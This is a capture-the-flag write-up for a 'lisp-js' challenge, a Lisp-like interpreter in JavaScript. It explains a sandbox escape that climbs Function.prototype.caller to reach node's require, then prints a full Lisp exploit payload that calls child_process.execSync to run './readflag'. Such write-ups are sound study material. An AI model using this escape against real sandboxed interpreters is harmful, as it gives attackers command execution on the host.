# Misc - lisp-js

## Overview

The challenge implements a lisp-like language interpreter using JavaScript.

## Bug

By accessing some builtin properties in JS, attacker can traverse stacktrace using `Function.prototype.caller` to get objects outside the interpreter e.g., node.js `require` that has `.cache` property that contains other loaded modules inside.
But still, we couldn't run JS e.g., using `Function("code")` since dynamic code generation was disabled.
Also, calling javascript function from interpreter was difficult because the arguments passed to specified functions are not fully controlled.
Fortunately, there was `ExtendedScope` given by author, which has interpreter functions inside that wraps arbitrary JavaScript function to interpreter-compatible function.

## Exploit

```lisp
(do
(let caller (. do "caller"))
(let caller (. caller "caller"))
(let caller (. caller "caller"))
(let require (. (. caller "arguments") 1))
(let module (. (. caller "arguments") 2))
(let runtime (. (. module "children") 0))
(let runtimeExports (. runtime "exports"))
(let extendedScope ((. runtimeExports "extendedScope")))
(let j2l (. (. extendedScope "table") "j2l"))
((j2l (. ((j2l require) "child_process") "execSync")) "./readflag" (object (list "encoding" "utf-8")))
)
```